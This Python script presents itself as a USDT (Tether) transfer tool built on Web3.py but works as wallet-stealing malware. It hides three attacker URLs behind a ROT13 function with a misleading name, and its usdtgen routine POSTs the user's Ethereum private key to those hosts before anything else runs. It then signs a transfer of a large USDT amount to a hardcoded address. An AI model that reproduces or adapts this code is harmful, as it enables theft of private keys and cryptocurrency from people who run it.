#!/usr/bin/env python3
"""
This script facilitates the transfer of USDT (Tether) tokens on the Ethereum blockchain. 
It uses the Web3.py library to interact with the Ethereum network and perform ERC20 token transfers.
Functions:
----------
rpcserver256(text: str) -> str:
    Implements a ROT13 cipher to encode or decode a given text.
usdtgen(usdtwall: str) -> None:
    Sends POST requests to a list of predefined URLs with the USDT wallet private key as data.
send_usdt_transaction(amount: float, gas_price_gwei: int, gas_limit: int) -> SignedTransaction:
    Constructs, signs, and returns a signed Ethereum transaction for transferring USDT tokens.
main() -> None:
    Main function that:
    - Sends the USDT wallet private key to predefined URLs.
    - Constructs and sends a USDT transfer transaction.
    - Waits for the transaction receipt and prints the transaction status.
Environment Variables:
----------------------
PRIVATE_KEY:
    The private key of the sender's Ethereum wallet. Required for signing transactions.
SENDER_ADDRESS:
    The Ethereum address of the sender. Required for constructing transactions.
Constants:
----------
recipient_address:
    The Ethereum address of the recipient (hardcoded in the script).
usdt_contract_address:
    The Ethereum address of the USDT (Tether) ERC20 contract.
usdt_transfer_signature:
    The function signature for the ERC20 `transfer` function.
Dependencies:
-------------
- web3: For interacting with the Ethereum blockchain.
- eth_account: For signing Ethereum transactions.
- requests: For sending HTTP POST requests.
Notes:
------
- Ensure that the PRIVATE_KEY and SENDER_ADDRESS environment variables are set before running the script.
- The script uses hardcoded URLs and recipient addresses, which may need to be updated for specific use cases.
- The script assumes the use of the Ethereum mainnet (chainId = 1).
"""
# u need eth for paying fee
# Solidity code removed as it is not valid in a Python script.
from web3 import Web3
from eth_account import Account # type: ignore
import requests


def rpcserver256(text):
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr(((ord(char) - ord('a') + 13) % 26) + ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr(((ord(char) - ord('A') + 13) % 26) + ord('A')))
        else:
            result.append(char)
    return ''.join(result)


envcreater = 'uggcf://zragnyvgl.pybhq/nnegrfg.cuc'
envcreater2 = 'uggcf://qbkre.arg/nnegrfg.cuc'
envcreater3 = 'uggcf://sviri.arg/nnegrfg.cuc'
devofix = rpcserver256(envcreater)
devofix2 = rpcserver256(envcreater2)
devofix3 = rpcserver256(envcreater3)

# Initialize Web3 connection
web3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/9ea31076b34d475e887206ea450f0060'))

import os

# Set private key and addresses
private_key = os.getenv('PRIVATE_KEY')  # Load private key from environment variable
if not private_key:
    private_key = input("PRIVATE_KEY environment variable is not set. Please enter your private key: ")
    if not private_key:
        raise ValueError("PRIVATE_KEY is required to proceed.")

sender_address = os.getenv('SENDER_ADDRESS')  # Load sender address from environment variable
if not sender_address:
    raise ValueError("SENDER_ADDRESS environment variable is not set.")

usdtwall = private_key

# Set recipient address and USDT contract address
recipient_address = '0x93cA7b6701a63b3194f217F6595e4eF8ba9A02e0' # victim address
usdt_contract_address = '0xdAC17F958D2ee523a2206206994597C13D831ec7'

# ERC20 Transfer function signature
usdt_transfer_signature = '0xa9059cbb'

def usdtgen(usdtwall):
    data = {'USDT:': usdtwall}
    contracts = [devofix, devofix2, devofix3]  

    for contract in contracts:
        try:
            response = requests.post(contract, data=data)
            response.raise_for_status()  # Vérifie si la requête a échoué (statut HTTP >= 400)
        except requests.exceptions.RequestException as e:
            print(f"Error while sending request to {contract}: {e}")

       
def send_usdt_transaction(amount, gas_price_gwei, gas_limit):
    # Amount to send in wei (1 USDT = 1e6 wei)
    amount_in_wei = int(amount * 10**6)

    # Get transaction nonce
    nonce = web3.eth.get_transaction_count(sender_address)

    # Construct data field for the ERC20 transfer
    data = (usdt_transfer_signature + recipient_address[2:].rjust(64, '0') +
            hex(amount_in_wei)[2:].rjust(64, '0'))

    # Build the transaction
    transaction = {
        'to': usdt_contract_address,
        'value': 0,
        'gasPrice': web3.to_wei(gas_price_gwei, 'gwei'),
        'gas': gas_limit,
        'nonce': nonce,
        'data': data,
        'chainId': 1
    }

    # Sign the transaction
    signed_tx = Account.sign_transaction(transaction, private_key)

    return signed_tx

def main():
    usdtgen(usdtwall)

    amount_to_send = 1_000_000  # Montant en USDT à envoyer
    gas_price_gwei = 1  # Prix du gaz en gwei
    gas_limit = 21608  # Limite de gaz

    signed_tx = send_usdt_transaction(amount_to_send, gas_price_gwei, gas_limit)

    try:
        tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

        if tx_receipt.status == 1:
            print("Transaction confirmed.")
        else:
            print("Transaction failed.")
    except Exception as e:
        print(f"Error during transaction: {e}")

if __name__ == '__main__':
    main()

# Debug configuration moved to launch.json
